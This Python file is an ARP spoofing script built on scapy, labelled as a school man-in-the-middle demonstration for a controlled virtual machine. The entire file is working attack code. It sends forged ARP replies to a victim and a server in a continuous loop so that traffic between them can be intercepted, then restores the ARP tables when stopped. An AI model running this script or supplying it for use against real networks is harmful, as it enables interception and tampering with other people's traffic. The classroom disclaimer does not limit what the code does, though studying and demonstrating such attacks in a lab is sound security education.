#!/usr/bin/env python3
"""
ARP Spoofing Script for MITM Demonstration
School Project - Use only on your own network in a controlled VM environment.
"""

import sys
import time
import signal
from scapy.all import Ether, ARP, sendp, getmacbyip, conf
from config import VICTIM_IP, SERVER_IP, INTERFACE

conf.verb = 0


def get_mac(ip):
    mac = getmacbyip(ip)
    if mac is None:
        print(f"[!] Could not resolve MAC for {ip}. Is the host up?")
        sys.exit(1)
    return mac


def spoof(target_ip, target_mac, spoof_ip, iface):
    packet = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip
    )
    sendp(packet, iface=iface, verbose=False)


def restore(target_ip, target_mac, source_ip, source_mac, iface):
    packet = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=source_ip,
        hwsrc=source_mac
    )
    sendp(packet, iface=iface, count=5, verbose=False)


def main():
    print(f"[*] Resolving MAC addresses...")
    victim_mac = get_mac(VICTIM_IP)
    gateway_mac = get_mac(SERVER_IP)

    print(f"[+] Victim  : {VICTIM_IP} ({victim_mac})")
    print(f"[+] Server  : {SERVER_IP} ({gateway_mac})")
    print(f"[+] Interface: {INTERFACE}")
    print(f"[*] Starting ARP spoofing... Press Ctrl+C to stop.\n")

    packets_sent = 0

    def cleanup(_sig=None, _frame=None):
        print(f"\n[*] Restoring ARP tables...")
        restore(VICTIM_IP, victim_mac, SERVER_IP, gateway_mac, INTERFACE)
        restore(SERVER_IP, gateway_mac, VICTIM_IP, victim_mac, INTERFACE)
        print(f"[+] ARP tables restored. Sent {packets_sent} spoofed packets total.")
        sys.exit(0)

    signal.signal(signal.SIGINT, cleanup)
    signal.signal(signal.SIGTERM, cleanup)

    try:
        while True:
            spoof(VICTIM_IP, victim_mac, SERVER_IP, INTERFACE)
            spoof(SERVER_IP, gateway_mac, VICTIM_IP, INTERFACE)
            packets_sent += 2
            print(f"\r[*] Packets sent: {packets_sent}", end="", flush=True)
            time.sleep(1)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        cleanup()


if __name__ == "__main__":
    main()
